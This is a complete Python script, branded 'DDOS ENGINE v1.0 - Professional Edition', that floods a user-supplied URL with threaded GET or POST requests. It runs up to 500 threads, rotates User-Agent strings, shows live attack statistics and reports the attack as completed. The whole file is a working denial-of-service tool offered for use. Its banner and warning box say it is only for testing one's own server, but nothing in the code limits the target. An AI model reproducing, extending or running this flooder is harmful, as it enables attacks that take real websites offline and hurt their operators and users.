#!/usr/bin/env python3
# ============================================================
#  ╔══════════════════════════════════════════════════════════╗
#  ║  DDOS ENGINE v1.0 - PROFESSIONAL EDITION               ║
#  ║  Create by vikk official                                ║
#  ║  "Test your own server, not others." 🔥               ║
#  ╚══════════════════════════════════════════════════════════╝
# ============================================================

import os
import sys
import time
import random
import threading
import requests
from datetime import datetime

# ============================================================
#  🎨 GLOBAL VARIABLES
# ============================================================
VERSION = '1.0'
AUTHOR = 'vikk official'
MAX_THREADS = 500

BANNER = """
\033[96m
╔═══════════════════════════════════════════════════════════════╗
║  ██████╗ ██████╗  ██████╗ ███████╗                          ║
║  ██╔══██╗██╔══██╗██╔═══██╗██╔════╝                          ║
║  ██║  ██║██████╔╝██║   ██║███████╗                          ║
║  ██║  ██║██╔══██╗██║   ██║╚════██║                          ║
║  ██████╔╝██║  ██║╚██████╔╝███████║                          ║
║  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝                          ║
║                                                               ║
║  ███████╗███╗   ██╗ ██████╗ ██╗███╗   ██╗███████╗         ║
║  ██╔════╝████╗  ██║██╔════╝ ██║████╗  ██║██╔════╝         ║
║  █████╗  ██╔██╗ ██║██║  ███╗██║██╔██╗ ██║█████╗           ║
║  ██╔══╝  ██║╚██╗██║██║   ██║██║██║╚██╗██║██╔══╝           ║
║  ███████╗██║ ╚████║╚██████╔╝██║██║ ╚████║███████╗         ║
║  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝╚═╝  ╚═══╝╚══════╝         ║
║                                                               ║
║  DDOS ENGINE v1.0 - PROFESSIONAL EDITION                     ║
║  "Test your own server, not others." 🔥                     ║
╚═══════════════════════════════════════════════════════════════╝
\033[0m
"""

# ============================================================
#  🛠️ UTILITY FUNCTIONS
# ============================================================
def clear():
    os.system('clear' if os.name == 'posix' else 'cls')

def loading_animation(text, duration=1.5):
    chars = ['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷']
    end_time = time.time() + duration
    i = 0
    while time.time() < end_time:
        sys.stdout.write(f'\r\033[96m[{chars[i % len(chars)]}] {text}\033[0m')
        sys.stdout.flush()
        time.sleep(0.1)
        i += 1
    sys.stdout.write(f'\r\033[92m[✓] {text}\033[0m\n')

def progress_bar(current, total, label='Progress'):
    bar_length = 30
    filled = int(bar_length * current / total)
    bar = '█' * filled + '░' * (bar_length - filled)
    percent = round(current / total * 100, 1)
    sys.stdout.write(f'\r\033[96m[{bar}] {percent}% - {label}\033[0m')
    sys.stdout.flush()

def loading(text):
    print(f"\033[92m[+] {text}\033[0m")

def error(text):
    print(f"\033[91m[-] {text}\033[0m")

def info(text):
    print(f"\033[94m[!] {text}\033[0m")

def success(text):
    print(f"\033[92m[✓] {text}\033[0m")

def warning(text):
    print(f"\033[93m[⚠] {text}\033[0m")

# ============================================================
#  🚀 DDOS ENGINE
# ============================================================
class DDoSEngine:
    def __init__(self, url, threads, duration, method='GET'):
        self.url = url
        self.threads = threads
        self.duration = duration
        self.method = method.upper()
        self.running = True
        self.stats = {'sent': 0, 'success': 0, 'failed': 0}
        self.lock = threading.Lock()
        self.start_time = None
    
    def attack(self):
        headers = {
            'User-Agent': self.get_random_ua(),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Connection': 'keep-alive'
        }
        try:
            if self.method == 'POST':
                response = requests.post(self.url, headers=headers, data={'t': str(time.time())}, timeout=3)
            else:
                response = requests.get(self.url, headers=headers, timeout=3)
            with self.lock:
                self.stats['sent'] += 1
                if response.status_code == 200:
                    self.stats['success'] += 1
                else:
                    self.stats['failed'] += 1
        except:
            with self.lock:
                self.stats['sent'] += 1
                self.stats['failed'] += 1
    
    def get_random_ua(self):
        uas = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/120.0.0.0',
            'Mozilla/5.0 (X11; Linux x86_64) Chrome/120.0.0.0',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0) AppleWebKit/605.1.15'
        ]
        return random.choice(uas)
    
    def worker(self):
        while self.running:
            self.attack()
    
    def start(self):
        self.start_time = time.time()
        threads = []
        loading(f"Initializing {self.threads} threads...")
        for i in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.daemon = True
            t.start()
            threads.append(t)
            if i % 10 == 0 or i == self.threads - 1:
                progress_bar(i + 1, self.threads, 'Spawning threads')
        print()
        loading_animation("Establishing connections...", 1.0)
        loading_animation("Injecting payloads...", 1.0)
        print(f"\n\033[91m☠️ ATTACK IN PROGRESS ☠️\033[0m")
        print("\033[90m" + "-"*55 + "\033[0m\n")
        try:
            while self.running:
                elapsed = int(time.time() - self.start_time)
                if elapsed >= self.duration:
                    self.running = False
                    break
                with self.lock:
                    sent = self.stats['sent']
                    rate = round(self.stats['success']/sent*100 if sent > 0 else 0, 1)
                    sys.stdout.write(f'\r\033[94m▶ Sent: {sent} | Success: {self.stats["success"]} | Failed: {self.stats["failed"]} | Rate: {rate}% | Time: {elapsed}s\033[0m')
                    sys.stdout.flush()
                time.sleep(0.5)
        except KeyboardInterrupt:
            self.running = False
        print("\n\n\033[93m[!] Stopping threads...\033[0m")
        for t in threads:
            t.join(timeout=1)
        return self.stats

# ============================================================
#  📊 SHOW STATS
# ============================================================
def show_stats(stats, duration):
    print("\n\033[96m╔═══════════════════════════════════════════════════════════════════╗\033[0m")
    print("\033[96m║                      📊 ATTACK SUMMARY                             ║\033[0m")
    print("\033[96m╚═══════════════════════════════════════════════════════════════════╝\033[0m")
    print(f"\n  \033[94mTotal Sent  :\033[0m {stats['sent']}")
    print(f"  \033[92mSuccess     :\033[0m {stats['success']} (\033[92m{round(stats['success']/stats['sent']*100 if stats['sent'] > 0 else 0, 1)}%\033[0m)")
    print(f"  \033[91mFailed      :\033[0m {stats['failed']} (\033[91m{round(stats['failed']/stats['sent']*100 if stats['sent'] > 0 else 0, 1)}%\033[0m)")
    print(f"  \033[94mDuration    :\033[0m {duration}s")
    print(f"  \033[94mRequests/s  :\033[0m {round(stats['sent']/duration if duration > 0 else 0, 1)}")
    rating = "🔥 EXTREME" if stats['sent'] > 1000 else "⚡ HEAVY" if stats['sent'] > 500 else "💪 MEDIUM" if stats['sent'] > 100 else "🐣 LIGHT"
    print(f"  \033[94mRating      :\033[0m {rating}")

# ============================================================
#  🎯 MAIN MENU
# ============================================================
def main():
    clear()
    print(BANNER)
    print("\033[93m")
    print("╔═══════════════════════════════════════════════════════════════════╗")
    print("║  ⚠️  WARNING: This tool is for testing your OWN server.        ║")
    print("║  ⚠️  Developer is NOT responsible for any misuse.              ║")
    print("║  ⚠️  Only use on servers you own or have permission.          ║")
    print("║  ⚠️  Max threads: 500 (use responsibly)                       ║")
    print("╚═══════════════════════════════════════════════════════════════════╝")
    print("\033[0m")
    print("\n\033[96m📌 CONFIGURATION:\033[0m")
    url = input("  \033[94mTarget URL\033[0m (https://example.com): ").strip()
    if not url.startswith('http://') and not url.startswith('https://'):
        url = 'https://' + url
    print("  \033[94mMethod:\033[0m 1. GET  2. POST")
    method_choice = input("  Select (1/2): ").strip()
    method = 'POST' if method_choice == '2' else 'GET'
    try:
        threads = int(input(f"  \033[94mThreads\033[0m (1-{MAX_THREADS}): ").strip())
        threads = max(1, min(threads, MAX_THREADS))
    except:
        threads = 50
    try:
        duration = int(input("  \033[94mDuration\033[0m (seconds): ").strip())
        duration = max(1, duration)
    except:
        duration = 30
    print("\n\033[93m" + "="*55 + "\033[0m")
    print(f"  \033[94mTarget  :\033[0m {url}")
    print(f"  \033[94mMethod  :\033[0m {method}")
    print(f"  \033[94mThreads :\033[0m {threads}")
    print(f"  \033[94mDuration:\033[0m {duration}s")
    print("\033[93m" + "="*55 + "\033[0m")
    confirm = input("\n\033[91m⚠️ Confirm attack (y/n): \033[0m").strip().lower()
    if confirm != 'y':
        print("\n\033[91m[!] Cancelled.\033[0m")
        sys.exit(0)
    clear()
    print(BANNER)
    print(f"\n\033[91m☠️ DDOS ENGINE v{VERSION} STARTED ☠️\033[0m")
    print(f"  \033[94mTarget\033[0m  : {url}")
    print(f"  \033[94mMethod\033[0m  : {method}")
    print(f"  \033[94mThreads\033[0m : {threads}")
    print(f"  \033[94mDuration\033[0m: {duration}s")
    print("\n\033[90m" + "="*55 + "\033[0m")
    print("\033[94mPress Ctrl+C to stop early\033[0m\n")
    loading_animation("Preparing attack vectors...", 1.2)
    loading_animation("Loading payload modules...", 1.0)
    engine = DDoSEngine(url, threads, duration, method)
    stats = engine.start()
    show_stats(stats, duration)
    print("\n\033[92m✅ Attack completed successfully. 🔥\033[0m")
    input("\n\033[96mPress Enter to continue...\033[0m")

# ============================================================
#  🚀 START
# ============================================================
if __name__ == '__main__':
    try:
        import requests
    except ImportError:
        print("\033[91m[!] requests not installed. Run: pip install requests\033[0m")
        sys.exit(1)
    main()
